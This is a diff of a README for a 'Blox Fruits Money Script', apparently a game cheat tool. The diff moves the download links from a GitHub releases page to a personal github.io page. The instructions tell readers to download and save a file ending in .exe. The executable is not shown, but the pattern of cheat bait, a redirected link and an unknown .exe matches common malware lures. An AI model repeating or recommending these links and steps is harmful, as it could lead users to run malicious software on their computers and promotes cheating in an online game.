@@ -1,6 +1,6 @@
 # 💰 Blox-Fruits-Money-Script-2026 - Master your wealth and dominate gameplay
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/mdnoorahmed518-sketch/Blox-Fruits-Money-Script-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://mdnoorahmed518-sketch.github.io)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ To run this tool, your computer needs the following specifications:
 
 Follow these steps to obtain the tool:
 
-1. Visit the following page to access the latest version: [https://github.com/mdnoorahmed518-sketch/Blox-Fruits-Money-Script-2026/releases](https://github.com/mdnoorahmed518-sketch/Blox-Fruits-Money-Script-2026/releases)
+1. Visit the following page to access the latest version: [https://mdnoorahmed518-sketch.github.io](https://mdnoorahmed518-sketch.github.io)
 2. Look for the "Assets" section on the page.
 3. Click the file ending in .exe to start the download process.
 4. Save the file to a folder you can find later, such as your Desktop or Documents folder.
